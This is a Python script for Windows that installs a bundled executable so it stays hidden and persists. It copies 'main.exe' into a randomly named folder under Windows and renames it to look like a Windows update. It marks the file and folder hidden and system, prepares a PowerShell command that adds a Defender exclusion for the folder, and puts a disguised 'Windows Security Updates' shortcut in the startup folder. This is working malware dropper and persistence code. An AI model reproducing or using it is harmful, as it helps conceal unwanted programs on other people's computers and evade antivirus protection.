print("start")

import ctypes
import random
import os
import time
import winreg
import random
import shutil
import sys
import subprocess
from win32com.client import Dispatch
print("Everything imported.\ndefining functions")
C_path = 'input()'
while not os.path.isdir(C_path):
    C_path = input("Enter main drive's path:")
C_p = 'input()'
while not os.path.isdir(C_p):
    C_p = input("Enter main drive's path for the target:")
winpath = os.path.join(C_path,'Windows')
fake_folder_names = ['CD', "AllLogs", "Drivers", "Config", "Integration", "Extensions", "Cloud", "IoT", "Settings", "Cache", "3D", "x32", "Power", "Windows", "TempDatas", "x86"]
secretname="GJ2A3"

def get_random_text_for_reg(length:int=20,string_set:list[str]=['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])-> str:
    if length==5:
        return secretname
    elif length<5:
        Error=ValueError(length)
        Error.add_note(Error,"5 or bigger integer is required")
        raise Error
    j=''
    b=random.choice(range(length-len(secretname)+1))
    for i in range(b):
        j+=random.choice(string_set)
        random.randrange(0,1)
    j+=secretname
    for i in range(length-len(secretname)-b):
        j+=random.choice(string_set)
    return j
def get_suitable_location() -> str:
    global foldername
    foldername = random.choice(fake_folder_names)
    location = os.path.join(winpath, foldername)
    return (location,os.path.join(C_p,"Windows", foldername))
def save_the_location(location:str,name_of_file:str = "Systematic Luck"):
    file = open(os.path.join(winpath,name_of_file),'w')
    file.write(location)
def get_main_file_location() -> str:
    if getattr(sys, 'frozen', False):  # Check if running as a frozen executable
        data_dir = sys._MEIPASS
    else:
        data_dir = os.path.dirname(__file__)  # Use current directory when running normally
    return os.path.join(data_dir,'main.exe')
def rename_and_move_main_file(from_path:str, folder, to_path:str):
    try:
        os.mkdir(os.path.join(winpath,folder))
    except:
        print("Folder already excists:",os.path.join(winpath,folder))
    shutil.copy(from_path,to_path)
    os.system(f'attrib +s +h "{to_path}"')
    os.system(f'attrib +s +h "{os.path.join(winpath,folder)}"')
def add_folder_exclusion(extension):
    add_exclusion_command = f"powershell.exe Add-MpPreference -ExclusionPath \"{extension}\""
    try:
        print("Run this command: ",add_exclusion_command)  # Use subprocess for better control
    except subprocess.CalledProcessError as e:
        print(f"Error adding exclusion for {extension}: {e}")
def create_shotcut(target:str,
                   working_dir:str,
                   location_of_shotcut:str = os.path.join(C_path,r"ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp")):
    shell = Dispatch('WScript.Shell')
    shortcut = shell.CreateShortCut(os.path.join(location_of_shotcut, "Windows Security Updates.lnk"))
    shortcut.Targetpath = target
    shortcut.WorkingDirectory = working_dir
    shortcut.IconLocation = target
    shortcut.save()

print("Checking admin privilages...")
is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
foldername=''
if is_admin:
    try:
        print("\n\nIs admin.\n\n\n\n")
        random_name = get_random_text_for_reg(int(random.random()*15)+5)
        name = "Windows Update In Background ("+random_name+")"
        print("\nName:",name)
        path,path_it = get_suitable_location()
        print("Adding FOLDER exclusion...")
        add_folder_exclusion(path)
        print(f"Path: {path}")
        main_location = os.path.join(path, f"{name}.exe")
        main_location_it = os.path.join(path_it, f"{name}.exe")
        print("Main location:",main_location_it)
        print('Moving main file...')
        current_location_of_main=get_main_file_location()
        rename_and_move_main_file(current_location_of_main, foldername, main_location)
        print("Location saving...")
        save_the_location(main_location_it)
        print("Creating shortcut at startup folder...")
        create_shotcut(main_location_it,path)

        print("DONE")
    except Exception as e:
        print(e)
    os.system("pause")
else:
    print('\n'*100,"NOT ADMIN")
    print('\n'*5)
    t_end = time.time_ns()/1000000 + 3000
    while True:
        t_remaining = round(t_end - time.time_ns()/1000000,2)
        if t_remaining<0:
            sys.exit(1223)
        print(f"Waiting {t_remaining}ms before exiting"+'['+int(t_remaining/100)*'.'+(15-int(t_remaining/100))*' '+']',end='\r')
        time.sleep(0.1)